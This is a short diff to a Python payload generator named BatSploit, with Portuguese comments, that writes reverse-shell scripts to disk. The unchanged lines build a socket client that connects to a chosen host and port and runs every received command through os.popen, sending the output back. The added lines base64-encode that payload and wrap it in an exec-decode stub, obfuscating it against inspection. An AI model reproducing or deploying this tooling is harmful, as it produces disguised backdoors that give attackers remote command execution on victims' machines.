@@ -128,8 +128,11 @@ class BatSploit(object):
 			code += "s.connect(('%s', %i))\n"%(host, port)
 			code += "while True:\n"
 			code += "	s.send(os.popen(s.recv(1024)).read())"
+			encode = code.encode('base64').replace("\n", "") # isso codifica o código
+			payload_coded = "string = '%s'\n"%(encode)
+			payload_coded += "exec(string.decode('base64'))" # isso decodifica e executa o payload
 			payload_file = open(name, 'w') # abri o arquivo dst
-			payload_file.write(code) # escreve o código no arquivo
+			payload_file.write(payload_coded) # escreve o código no arquivo
 			payload_file.close() # fecha o arquivo
 			size_payload = os.path.getsize(name) # tamanho do payload
 			sys.stdout.write(colored("\n[+] ", "green"))
@@ -155,8 +158,11 @@ class BatSploit(object):
 			code += "	if len(saida_cmd) == 0:\n"
 			code += "		saida_cmd = '[+] Executed !'\n"
 			code += "	s.send(saida_cmd)"
+			encode = code.encode('base64').replace("\n", "") # isso codifica o código
+			payload_coded = "string = '%s'\n"%(encode)
+			payload_coded += "exec(string.decode('base64'))" # isso decodifica e executa o payload
 			payload_file = open(name, 'w') # abri o arquivo dst
-			payload_file.write(code) # escreve o código no arquivo
+			payload_file.write(payload_coded) # escreve o código no arquivo
 			payload_file.close() # fecha o arquivo
 			size_payload = os.path.getsize(name) # tamanho do payload
 			sys.stdout.write(colored("\n[+] ", "green"))
